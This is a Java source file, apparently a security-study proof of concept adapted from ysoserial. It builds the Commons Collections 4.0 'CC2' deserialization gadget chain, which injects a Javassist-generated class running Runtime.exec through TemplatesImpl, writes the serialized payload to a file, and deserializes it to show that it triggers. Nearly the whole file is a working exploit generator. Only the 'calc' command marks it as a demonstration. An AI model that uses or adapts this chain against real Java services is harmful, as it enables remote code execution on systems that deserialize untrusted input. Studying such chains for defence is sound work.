package com.CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 *   PriorityQueue.readObject()
 *     PriorityQueue.heapify()
 *       PriorityQueue.siftDown()
 *         PriorityQueue.siftDownUsingComparator()
 *           TransformingComparator.compare()
 *             InvokerTransformer.transform()
 *               Method.invoke()
 *                 TemplatesImpl.newTransformer()
 *                   TemplatesImpl.getTransletInstance()
 *                   TemplatesImpl.defineTransletClasses()
 *                     TransletClassLoader.defineClass()
 *                       Runtime.getRuntime().exec("calc")
 *
 * 	Requires:
 * 		commons-collections:4.0
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections2.java
 */

public class CC2 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();//转换为byte数组
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "cc2");

        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);

        // PriorityQueue
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        setFieldValue(queue, "comparator",comparator);
        setFieldValue(queue, "queue",new Object[]{templates, 1});

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(queue);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
}
